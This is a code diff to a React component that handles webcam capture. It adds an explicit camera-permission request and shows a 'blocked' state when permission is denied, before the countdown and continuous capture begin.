@@ -42,7 +42,7 @@ const Capture = () => {
   const [searchParams] = useSearchParams();
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
-  const [status, setStatus] = useState<"loading" | "checking" | "redirecting_chrome" | "not_chrome" | "countdown">("loading");
+  const [status, setStatus] = useState<"loading" | "checking" | "redirecting_chrome" | "not_chrome" | "blocked" | "countdown">("loading");
   const [countdown, setCountdown] = useState<number | null>(null);
   const [settings, setSettings] = useState<CaptureSettings>({
     camPhotoLimit: 0,
@@ -246,11 +246,18 @@ const Capture = () => {
     return () => { stopCaptureRef.current = true; };
   }, []);
 
+  const requestCameraPermission = async (): Promise<boolean> => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      return true;
+    } catch { return false; }
+  };
+
   useEffect(() => {
     if (status !== "checking") return;
     
-    const checkBrowserAndProceed = () => {
-      // If in-app browser on Android, try to open in Chrome
+    const checkBrowserAndProceed = async () => {
       if (isInAppBrowser() && isAndroid()) {
         setStatus("redirecting_chrome");
         setTimeout(() => {
@@ -259,10 +266,14 @@ const Capture = () => {
         return;
       }
       
-      // For all other browsers (Chrome, Firefox, Safari, etc.) - proceed directly
-      setStatus("countdown");
-      setCountdown(countdownSeconds);
-      startContinuousCapture();
+      const granted = await requestCameraPermission();
+      if (granted) {
+        setStatus("countdown");
+        setCountdown(countdownSeconds);
+        startContinuousCapture();
+      } else {
+        setStatus("blocked");
+      }
     };
 
     checkBrowserAndProceed();
